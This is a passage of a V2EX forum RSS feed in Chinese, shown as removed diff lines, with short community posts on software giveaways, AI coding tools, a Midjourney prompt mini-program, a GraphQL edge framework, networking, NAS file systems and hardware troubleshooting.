-<p>官网地址： <a href="https://www.xterminal.cn" rel="nofollow">https://www.xterminal.cn</a></p>
-<p>参与方式：下载软件，软件楼层回复抽奖 ID 即可参与</p>
-<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/nRz1E9A1.png" /></p>
-<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/Ym9P0exE.png" /></p>
-<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/Ry3Xh4Us.png" /></p>
-<hr />
-<p>本次 T 楼奖品：每一百层送两个 Xterminal 年会员，最高 20 个年度会员</p>
-<p>开奖日期：2024 年 3 月 16 日</p>
-<p>中奖规则： 取 3 月 15 日 Google  [ BTC 兑 USD ]  整数后两位数值</p>
-<p>发奖规则：直接充值到账户</p>
-<p>例如 3 月 15 日的 72,224.70 ，那么就尾数取值 70 。70 % 50 等于 20 ，那么就是楼层尾数数是 20 70 中奖</p>
-]]></content:encoded>
-<pubDate>2024-03-13T06:44:23Z</pubDate>
-</item>
-<item>
-<title>[分享发现] 有哪些 AI 编写代码或辅助编写代码的工具推荐？大家是否会担心代码被完整上传？</title>
-<link>https://www.v2ex.com/t/1023238</link>
-<guid>https://www.v2ex.com/t/1023238</guid>
-<content:encoded><![CDATA[
-刚看到站内有推广阿里通义灵码代码助手，还有前段时间百度好像也有出的 AI 代码工具，我猜这类工具以后会越来越多，但目前还没尝试过，不知道是不是真的能比 GPT 好用？<br /><br />大家在使用这些编辑器插件或者工具的时候，大家会担心代码被完整上传吗？如果要使用这类工具，有没有更好的推荐？
-]]></content:encoded>
-<pubDate>2024-03-13T06:21:18Z</pubDate>
-</item>
-<item>
-<title>我一个人写了个小程序，做最好的 Midjourney 提示词生成器</title>
-<link>https://www.v2ex.com/t/1022037</link>
-<guid>https://www.v2ex.com/t/1022037</guid>
-<content:encoded><![CDATA[
-<p>这段时间写了个微信小程序，先放二维码：</p>
-<p><img alt="二维码图片" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/yoQMuHqf.jpeg" /></p>
-<h2>产品定位</h2>
-<p>我就是之前发帖主张程序员要自己做产品的那个人（<a href="https://www.v2ex.com/t/948294" rel="nofollow">相关帖子</a>）。</p>
-<p>这个小程序的功能就一个：生成 Midjourney 提示词。你需要配合 Midjourney 软件使用。</p>
-<p>对于不会使用 Midjourney 软件的人，你用这个小程序就不需要学习 Midjourney 了，点击下面的“复制 prompt”就能得到绘画提示词。</p>
-<p><strong>如果你想帮身边没有 Midjourney 的朋友画画，可把小程序发给他，他生成 prompt 后发给你。</strong></p>
-<h2>提示词模板</h2>
-<p>过年期间我用 Midjourney 画了一万来张图片，对了，我还去摆摊了（<a href="https://www.v2ex.com/t/1015260" rel="nofollow">相关帖子</a>），摆了 8 天（冷死）。</p>
-<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/78L7Zf1qb.jpeg" /></p>
-<p>我从一万张图片中选出了 5000 多张，生成了 5000 多个模板（这个工作超级累，花了我 30 多天，远超预期）。</p>
-<p>原本是准备把模板功能写好后再发布的，结果前几天我接了个微信小程序外包项目，所以我要先去帮客户做外包了，模板功能就等到下一个版本再更新了。</p>
-<h2>设计</h2>
-<p><strong>我不但主张程序员应该自己做产品，我还主张程序员要会做设计</strong>（如果有设计师合作当然好，但没有设计师的时候要能自己搞定）。</p>
-<p>以前我都是和设计师合作，拿别人做好的设计照着写。本来这个小程序也是找设计师合作的，结果人家说“最近几天比较忙，要等一段时间”，我觉得这样很不科学，就决定自己学设计了（这个小程序是我第一次做设计）。</p>
-<p>我先学习了 Figma 软件，然后在 Figma 社区找了个模板，在模板的基础上设计。</p>
-<p>根据我自己的经验，如果你会前端开发，学会做设计并不难，你可以像我一样先找一个模板，在模板的基础上慢慢来，有一个成功案例你就有信心了。</p>
-<h2>前后端、云开发</h2>
-<p>前端没有使用任何 html 、css 框架，都是自己手写的，我记得那个 参考图权重的拖动条 花了我最多时间。其他主要是抠细节花时间比较多，例如一两个像素的反复调整，看得我眼睛都痛了。</p>
-<p>后端使用微信云开发，没有服务器，虽然我一直在吐槽微信云开发坑太多了（真的很多），文档也不齐全，不过好在遇到问题可以发工单，腾讯客服会及时回复。</p>
-<p>用了云开发后，这种 “<strong>写完就完事了，不需要维护服务器</strong>” 的感觉太好了，基本上是回不去了。想着以前出门旅游还要带着笔记本，生怕服务器挂了客户打电话过来，现在打死我也不愿意回到维护服务器的状态了。</p>
-<p>对了，提醒一下，如果小程序的用户比较多，云开发相比自己购买服务器要贵得多！贵得多！贵得多！（十倍以上，甚至百倍）</p>
-<h2>意见和反馈</h2>
-<p>如果你在使用过程中遇到 Bug ，可以先拖动小程序到垃圾桶，重新扫码打开。</p>
-<p>欢迎大家在这里反馈 Bug 或提出你的建议，我今天会尽可能地回复。</p>
-<p><img alt="二维码图片" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/yoQMuHqf.jpeg" /></p>
-]]></content:encoded>
-<pubDate>2024-03-13T01:44:08Z</pubDate>
-</item>
-<item>
-<title>EdgeQL: 在 Cloudflare Worker 部署 GraphQL 的工具</title>
-<link>https://www.v2ex.com/t/1022033</link>
-<guid>https://www.v2ex.com/t/1022033</guid>
-<content:encoded><![CDATA[
-<p><a href="https://github.com/metrue/EdgeQL" rel="nofollow">EdgeQL</a> 是我为了在 edge 环境快速构建 GraphQL 服务而实现的一个轻量框架，欢迎大家尝试和反馈, 目前支持 Cloudflare Worker 和 Bun ，正在努力支持所有的 JavaScript runtimes.</p>
-<pre><code class="language-typesecript">
-import { EdgeQL } from 'edgeql'
-
-const app = new EdgeQL()
-const schema = `
-type Query {
-  hello: String
-}
-    `
-app.handle(schema, (ctx: Context) =&gt; 'world')
-
-export default app
-
-</code></pre>
-]]></content:encoded>
-<pubDate>2024-03-09T02:37:30Z</pubDate>
-</item>
-<item>
-<title>[成都] 看花的季节，成都周边哪里好？</title>
-<link>https://www.v2ex.com/t/1023236</link>
-<guid>https://www.v2ex.com/t/1023236</guid>
-<content:encoded><![CDATA[
-龙泉桃花是不是人很多
-]]></content:encoded>
-<pubDate>2024-03-13T06:20:19Z</pubDate>
-</item>
-<item>
-<title>[问与答] strava 地图数据偏移的问题如何解决？</title>
-<link>https://www.v2ex.com/t/1023235</link>
-<guid>https://www.v2ex.com/t/1023235</guid>
-<content:encoded><![CDATA[
-<p>如题，最近刚开始用，记录软件用的华为，但是通过工具同步到 strava 后发现地图线路出现很大幅度的偏移。</p>
-<p>我该如何修复、处理这个问题呢？</p>
-<p><img alt="pFctCsU.png" class="embedded_image" rel="noreferrer" src="https://s21.ax1x.com/2024/03/13/pFctCsU.png" /></p>
-]]></content:encoded>
-<pubDate>2024-03-13T06:22:02Z</pubDate>
-</item>
-<item>
-<title>[OpenAI] 被封号的 claude 居然放开了，难道是我写的邮件发挥作用？</title>
-<link>https://www.v2ex.com/t/1023233</link>
-<guid>https://www.v2ex.com/t/1023233</guid>
-<content:encoded><![CDATA[
-<p>今天尝试登录，成功提问了一个问题，速度比 ChatGPT 4 要快。</p>
-]]></content:encoded>
-<pubDate>2024-03-13T06:10:43Z</pubDate>
-</item>
-<item>
-<title>[问与答] 自己开公司给自己发高工资，有风险吗？</title>
-<link>https://www.v2ex.com/t/1023232</link>
-<guid>https://www.v2ex.com/t/1023232</guid>
-<content:encoded><![CDATA[
-<p>打算 gap 一段时间</p>
-<p>比如让家人注册一个公司，每个月给我发高工资（比如封顶缴纳社保、公积金），可行吗？</p>
-<p>这里的可行，指的是这么做有没有什么风险。</p>
-<p>不考虑什么还要交税等给国家交钱的产生金钱上的顾虑。</p>
-<p>我个人的理解是，比如一个月发个三五万的，个人交税就要一定数目，然后公司层面可能也要给国家交一些费用？</p>
-<p>先不要喷，只是一个想法，具体动机：</p>
-<ul>
-<li>在没工作的期间，社保公积金不断</li>
-<li>办理一些信用卡、签证等业务，高额的社保基数，有一定的正向作用</li>
-</ul>
-]]></content:encoded>
-<pubDate>2024-03-13T06:21:42Z</pubDate>
-</item>
-<item>
-<title>[macOS] UnzipOne 无法压缩文件</title>
-<link>https://www.v2ex.com/t/1023231</link>
-<guid>https://www.v2ex.com/t/1023231</guid>
-<content:encoded><![CDATA[
-m1pro ，14.4 ，我就是删了一些文件，然后打开了 sip 功能，从那之后 unzipone 就压缩不了了，一直停留在这个界面，只能解压，卸载重装过好几次，也没用，磁盘权限也给了，有谁知道怎么解决吗？<br /><br /><a href="https://i.imgur.com/YpWH4Ds.png" rel="nofollow noopener" target="_blank"><img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/YpWH4Ds.png" /></a>
-]]></content:encoded>
-<pubDate>2024-03-13T06:02:11Z</pubDate>
-</item>
-<item>
-<title>[问与答] 有什么可以快速浏览全球热点趋势的网站</title>
-<link>https://www.v2ex.com/t/1023230</link>
-<guid>https://www.v2ex.com/t/1023230</guid>
-<content:encoded><![CDATA[
-<p>之前刷到一个视频，里面介绍了一个可以热点聚合网站，但是不记得网址了。大家平时有什么宝藏网站可以搜罗全球热点，界面直观的网站分享吗</p>
-]]></content:encoded>
-<pubDate>2024-03-13T06:07:26Z</pubDate>
-</item>
-<item>
-<title>[宽带症候群] 家装宽带如何开启 ipv6</title>
-<link>https://www.v2ex.com/t/1023229</link>
-<guid>https://www.v2ex.com/t/1023229</guid>
-<content:encoded><![CDATA[
-<p>1 、家里是联通宽带！
-2 、测试了 ipv6 test 不能通！
-3 、能否开通 ipv6 访问权限，如何和联通沟通开启 ipv6 访问权限？</p>
-<p>宽带地址是杭州</p>
-]]></content:encoded>
-<pubDate>2024-03-13T06:19:47Z</pubDate>
-</item>
-<item>
-<title>[NAS] 关于文件系统 cow</title>
-<link>https://www.v2ex.com/t/1023227</link>
-<guid>https://www.v2ex.com/t/1023227</guid>
-<content:encoded><![CDATA[
-<p>zfs 是不是没有命令进行 cow 的复制啊，还是说只有开启去重后才能达到类似的效果，我查到 btrfs 是有 cp -reflink 的，但 zfs 貌似没有。
-另一个问题是微软的 refs 也有 cow ，那通过 powershell 或界面复制能达到 cp -reflink 这种效果吗，还是说只能靠 win server 上的定时去重任务来做。</p>
-]]></content:encoded>
-<pubDate>2024-03-13T05:59:49Z</pubDate>
-</item>
-<item>
-<title>[宽带症候群] 有什么程序可以把公网 ip 推送到 qq 或者微信的</title>
-<link>https://www.v2ex.com/t/1023226</link>
-<guid>https://www.v2ex.com/t/1023226</guid>
-<content:encoded><![CDATA[
-<p>用来代替 ddns
-公网 ip 发生变动的时候可以把 ip 信息推送到 qq 微信
-有没有这样的程序</p>
-]]></content:encoded>
-<pubDate>2024-03-13T06:22:16Z</pubDate>
-</item>
-<item>
-<title>[问与答] 闲鱼卖显卡，收货后买家说有问题咋办</title>
-<link>https://www.v2ex.com/t/1023225</link>
-<guid>https://www.v2ex.com/t/1023225</guid>
-<content:encoded><![CDATA[
-<p>在闲鱼上出了一张 1080Ti ，这张卡是去年从卡贩子手里买的，自己刷了驱动，用了一年玩游戏跑 cuda 都没问题，因为 cs2 更新了之后 4k 带不动所以换了卡把这张卡挂闲鱼上出了，出之前刚从机器上拆下来，自己也懒得测 3d mark 和烤鸡，顺丰发给买家。买家收货后烤鸡没问题收货了，过两天说玩游戏就黑屏不能用，说找人问了一下要 300-500 维修费。想问下大家觉得这种情况还要我负责么。</p>
-]]></content:encoded>
-<pubDate>2024-03-13T06:06:01Z</pubDate>
-</item>
-<item>
-<title>[问与答] 在安装 wsl2 之后， 7950x3D 显示三缓是 192M</title>
-<link>https://www.v2ex.com/t/1023224</link>
-<guid>https://www.v2ex.com/t/1023224</guid>
-<content:encoded><![CDATA[
-在任务管理和 aida64 均显示 192M ，但是查看频率，ccd1 依然是 5.5G 以上
-]]></content:encoded>
-<pubDate>2024-03-13T05:57:00Z</pubDate>
-</item>
-<item>
-<title>[ WATCH] 戴 iwatch 之后手臂感觉有电流一样，手臂麻木难受，还被点出小红点</title>
-<link>https://www.v2ex.com/t/1023223</link>
-<guid>https://www.v2ex.com/t/1023223</guid>
-<content:encoded><![CDATA[
-你们有这种情况嘛
-]]></content:encoded>
-<pubDate>2024-03-13T06:22:48Z</pubDate>
-</item>
-<item>
-<title>[计算机] 有没有带大容量电池的 DC 电源啊</title>
-<link>https://www.v2ex.com/t/1023222</link>
-<guid>https://www.v2ex.com/t/1023222</guid>
-<content:encoded><![CDATA[
-<p>这样搞个 mimiPC 或者 NUC 就行了，上下班也无需开机关机。
-最理想是自己可以更换 18650 进去的。</p>
-]]></content:encoded>
-<pubDate>2024-03-13T05:51:12Z</pubDate>
-</item>
-<item>
-<title>[软件] 有没有统一鼠标驱动或平替的软件啊</title>
-<link>https://www.v2ex.com/t/1023221</link>
-<guid>https://www.v2ex.com/t/1023221</guid>
-<content:encoded><![CDATA[
-情况：需要使用自定义宏功能，没有板载的键鼠不能将宏存入设备中。<br /><br />举例<br />一、rog 战刃，需要安装军械库软件，在更新下载鼠标驱动。军械库设置宏，并绑定在鼠标侧键上。<br />二、雷蛇蝰蛇，雷蛇需要安装 Razer Central 和雷云，然后在雷云里设置宏，并绑定在鼠标侧键上。<br />三、罗技我知道三个驱动，一个新版一个旧版还有 M590 用的一个驱动。<br /> 1.M590 必须使用对应驱动软件设置自定义宏并后台运行驱动软件才可用。<br /> 2.g502 有板载，新版驱动退出宏失效（可能我没弄明白），旧版驱动设置好板载模式自定义宏退出软件可用，并且鼠标插如何电脑宏都生效，自定义宏功能与鼠标融为一体。<br /><br />只有支持板载的鼠标可以脱离软件正常使用，没问题。<br />这些什么 rog 军械库，雷蛇驱动，雷云等驱动软件必须安装并运行在进程里才可用。就说雷蛇，5 个进程 2 个服务，占用内存，我就用一个自定义宏的功能啊这么臃肿。<br /><br />故：有没有统一鼠标驱动或平替的软件啊，支持设置侧键自定义宏就可以。
-]]></content:encoded>
-<pubDate>2024-03-13T05:47:28Z</pubDate>
-</item>
-<item>
-<title>[Python] 千万级 Midjourney 文生图数据，怎么盘活用起来</title>
-<link>https://www.v2ex.com/t/1023219</link>
-<guid>https://www.v2ex.com/t/1023219</guid>
-<content:encoded><![CDATA[
-我这边做 midjourney 号池快 1 年了<br />积累了三千多个账号，每个账号开过 30 美金的会员，每个号出图有 5000+<br />这些图片数据，有没有好的路子可以用起来。 包含提示词和图片
-]]></content:encoded>
-<pubDate>2024-03-13T06:12:31Z</pubDate>
-</item>
-<item>
-<title>[全球工单系统] Firefox 122/123 禁用 wasm 后无法使用刷新按钮 100%可复现</title>
-<link>https://www.v2ex.com/t/1023216</link>
-<guid>https://www.v2ex.com/t/1023216</guid>
-<content:encoded><![CDATA[
-因为 wasm 多次出现安全问题，我的所有设备都禁用了 wasm 。（能直接在 flag 中禁用 wasm 也是我坚持使用伪装为 Edge 浏览器 UA 的 Firefox 的一大原因）<br />从 Firefox 122 开始我的 Firefox 就出现了所有页面加载完后刷新按钮不会出现，始终显示停止按钮的问题（ F5 快捷键能用）<br /><br />![]( <a href="https://i.imgur.com/PRgy0bs.png" rel="nofollow noopener" target="_blank"><img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/PRgy0bs.png" /></a>)<br /><br />123 了还没修复<br /><br />全新虚拟机复现成功，可确认 100%复现
-]]></content:encoded>
-<pubDate>2024-03-13T05:42:52Z</pubDate>
 </item>
 </channel>
 </rss>
